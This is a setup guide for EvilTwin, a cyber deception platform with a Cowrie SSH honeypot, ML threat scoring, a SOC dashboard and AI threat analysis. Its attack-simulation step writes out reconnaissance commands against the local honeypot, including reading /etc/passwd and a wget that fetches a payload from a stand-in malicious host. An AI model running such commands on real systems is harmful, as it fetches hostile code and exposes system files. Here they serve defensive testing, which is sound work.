---
id: getting-started
title: Getting Started
---

# Getting Started

This guide takes you from an empty machine to a fully running EvilTwin cyber deception environment in under 15 minutes. Every step is explained so you understand *what* you are doing and *why*.

:::tip What you will have at the end
A locally running stack with: a fake SSH honeypot that captures attacker commands, a backend API scoring threats with ML, a real-time SOC dashboard, and an AI assistant you can ask "what does this attack mean?"
:::

## Prerequisites

Before starting, make sure your machine has:

| Tool | Minimum Version | Why It's Needed |
|---|---|---|
| **Docker + Docker Compose** | Docker 24+, Compose v2 | Runs all services in isolated containers |
| **Node.js** | v20+ | Runs the React frontend dashboard |
| **Python** | 3.11+ | Only needed if developing the backend locally outside Docker |
| **curl** | Any | Used to verify services are running |

**Check your versions:**
```bash
docker --version          # should say 24.x or higher
docker compose version    # should say v2.x
node --version            # should say v20.x or higher
python3 --version         # should say 3.11.x or higher
```

## Step 1: Clone the Repository

```bash
git clone https://github.com/your-org/eviltwin.git
cd eviltwin
```

## Step 2: Configure Your Environment

EvilTwin reads all its settings from a `.env` file. Start by copying the example:

```bash
cp .env.example .env
```

Now open `.env` in a text editor and set the **required** values:

```bash
# A strong password for the database — change this before production use
POSTGRES_PASSWORD=changeme_strong_password_here

# A random secret for verifying canary webhook signatures
# Generate one: openssl rand -hex 32
CANARY_WEBHOOK_SECRET=your_canary_secret_here

# A random secret for signing JWT login tokens
# Generate one: openssl rand -hex 32
SECRET_KEY=your_super_secret_jwt_key_here
```

:::warning Port conflicts on standard ports
By default, the Cowrie SSH honeypot listens on port `22` and Dionaea on ports `21`, `80`, and `445`. If your machine already uses any of these ports (for example, your real SSH daemon uses port 22), you need to change the honeypot port mappings in `docker-compose.yml`.

To check if a port is already in use:
```bash
ss -tlnp | grep ':22'
```
:::

**Optional — Enable the AI assistant:**

If you want the AI threat analysis features (explaining threats in plain English, extracting TTPs, MITRE ATT&CK mapping), add an API key for any OpenAI-compatible provider:

```bash
# Your API key (leave empty to disable AI features — the rest of the platform works without it)
LLM_API_KEY=sk-...

# Which model to use (gpt-4o-mini is fast and cheap)
LLM_MODEL=gpt-4o-mini

# Use a local model with Ollama instead of OpenAI:
# LLM_BASE_URL=http://localhost:11434/v1
# LLM_API_KEY=ollama
# LLM_MODEL=llama3
```

## Step 3: Start the Core Services

Docker Compose orchestrates all services. Start the essential ones first:

```bash
docker compose up --build -d postgres backend cowrie ryu
```

What each service does:

| Service | What it is |
|---|---|
| `postgres` | The database storing all sessions, attacker profiles, alerts, and users |
| `backend` | The FastAPI brain — ingests events, scores threats, serves the API |
| `cowrie` | An SSH/Telnet honeypot that records everything attackers do |
| `ryu` | The SDN controller that redirects dangerous attackers at the network level |

Wait about 20–30 seconds for services to fully start, then verify they are healthy:

```bash
docker compose ps          # should show all services as "healthy" or "running"
curl -s http://localhost:8000/health | python3 -m json.tool
```

A healthy response looks like this:

```json
{
  "status": "healthy",
  "database": true,
  "model_loaded": true,
  "uptime_seconds": 42.1
}
```

:::note What if it says "database: false"?
PostgreSQL takes a few seconds to initialize. Wait 15 seconds and try again. If it still fails, check `docker compose logs postgres --tail=50`.
:::

## Step 4: Run Database Migrations

Migrations apply the latest database schema (tables, columns, indexes). You only need to run this once after setup, and again after future updates:

```bash
docker compose exec backend alembic upgrade head
```

You should see output like:
```
INFO  [alembic.runtime.migration] Running upgrade  -> 001, initial schema
INFO  [alembic.runtime.migration] Running upgrade 001 -> 002, add indexes
INFO  [alembic.runtime.migration] Running upgrade 002 -> 003, ...
INFO  [alembic.runtime.migration] Running upgrade 003 -> 004, add role to users
```

## Step 5: Create Your First User Account

The platform uses JWT-based authentication. Create an account via the API:

```bash
curl -s -X POST http://localhost:8000/auth/register \
  -H "Content-Type: application/json" \
  -d '{"username": "analyst", "password": "SecurePass123!"}' \
  | python3 -m json.tool
```

Then log in to get your access token:

```bash
curl -s -X POST http://localhost:8000/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "analyst", "password": "SecurePass123!"}' \
  | python3 -m json.tool
```

Save the `access_token` from the response — you will need it to call protected endpoints:

```json
{
  "access_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "refresh_token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "token_type": "bearer"
}
```

:::tip What is a JWT token?
A JWT (JSON Web Token) is a digitally signed string that proves your identity. It contains your username and an expiry time, and is signed with the server's secret key so it cannot be forged. You send it as a header on every request: `Authorization: Bearer <token>`. It expires after 30 minutes by default, at which point you use the refresh token to get a new one.
:::

## Step 6: Start the SOC Dashboard

The Security Operations Center (SOC) dashboard is a React application showing live threat feeds, attack maps, and session details:

```bash
cd frontend
npm install
npm run dev
```

Navigate to `http://localhost:5173` in your browser. Log in with the account you just created.

You will see:
- A global attack map (empty for now — attacks will appear here)
- A live threat feed panel
- Session browsing and filtering
- The top bar showing WebSocket connection status

## Step 7: Simulate an Attack

Let's generate real activity to see the platform in action. Connect to the honeypot as an "attacker" would:

```bash
# Connect to the Cowrie SSH honeypot  
# Use any password when prompted — Cowrie will accept it
ssh root@localhost -p 22
```

Once inside, type some commands that look like reconnaissance:

```bash
whoami
id
cat /etc/passwd
ls -la /root
wget http://malicious.example.com/payload.sh
```

Then switch to your browser and watch the SOC Dashboard (`http://localhost:5173`). Within seconds you should see:
- A new session appearing in the Sessions page
- A threat score calculated by the ML model
- A live alert pushed via WebSocket if the threat level is high enough
- A new attacker dot on the global map

You can also query the backend directly:

```bash
# See all recorded sessions
TOKEN="your_access_token_here"
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8000/sessions?page=1&page_size=10" | python3 -m json.tool

# Get the threat score for your simulated attacker IP
curl -s -H "Authorization: Bearer $TOKEN" \
  "http://localhost:8000/score/127.0.0.1" | python3 -m json.tool
```

## Step 8: Try the AI Threat Analysis (Optional)

If you configured `LLM_API_KEY`, you can ask the AI to analyze any session:

```bash
# Get a session ID from the sessions list first
SESSION_ID="the-session-uuid-from-above"

curl -s -X POST http://localhost:8000/ai/analyze \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"session_id\": \"$SESSION_ID\"}" \
  | python3 -m json.tool
```

The AI returns:
- A plain-English summary of what the attacker was attempting
- MITRE ATT&CK technique codes (e.g., T1059.004 for Unix shell execution)
- Indicators of Compromise (command strings, file hashes, IPs)
- A risk assessment and recommended response actions

You can also have a conversation with the AI:

```bash
curl -s -X POST http://localhost:8000/ai/chat \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"message": "What does it mean when an attacker runs wget right after connecting?"}' \
  | python3 -m json.tool
```

## What's Next?

| I want to... | Go here |
|---|---|
| Understand how all components connect | [Master Guide](./master-guide.md) |
| Learn the full API | [API Reference](/dev/api-reference) |
| Deploy to production | [Operations and Deployment](./operations-and-deployment.md) |
| Add a new honeypot sensor | [Honeypot Integration](/dev/honeypot-integration) |
| Debug a problem | [Troubleshooting](./troubleshooting.md) |
| Respond to a real alert | [Incident Response Runbook](./incident-response-runbook.md) |
